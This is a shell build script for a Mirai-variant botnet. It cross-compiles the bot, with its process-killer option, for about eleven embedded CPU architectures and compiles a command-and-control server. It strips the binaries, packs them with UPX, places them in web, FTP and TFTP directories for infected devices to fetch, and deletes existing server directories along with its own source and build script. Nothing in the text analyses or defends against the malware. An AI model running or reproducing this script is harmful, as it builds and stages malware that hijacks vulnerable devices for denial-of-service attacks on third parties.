#!/bin/bash
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function arm7_compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}

rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp
mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/grgrgg32
gcc ~/cnc/cnc.c -ocnc -pthread


compile_bot i586 x86 "-static -DKILLER"
compile_bot mips mips "-static -DKILLER"
compile_bot mipsel mpsl "-static -DKILLER"
compile_bot armv4l arm "-static -DKILLER"
compile_bot armv5l arm5 "-DKILLER"
compile_bot armv6l arm6 "-static -DKILLER"
arm7_compile_bot armv7l arm7 "-static -DKILLER"
compile_bot powerpc ppc "-static -DKILLER"
compile_bot sparc spc "-static -DKILLER"
compile_bot m68k m68k "-static -DKILLER"
compile_bot sh4 sh4 "-static -DKILLER"

cp release/* /var/www/html/grgrgg32
cp release/* /var/ftp
mv release/* /var/lib/tftpboot
rm -rf release
rm -rf ~/bot ~/build.sh

wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
tar -xvf *.xz
mv upx*/upx .
./upx --ultra-brute /var/www/html/bins/*
./upx --ultra-brute /var/lib/tftpboot/*
rm -rf upx*
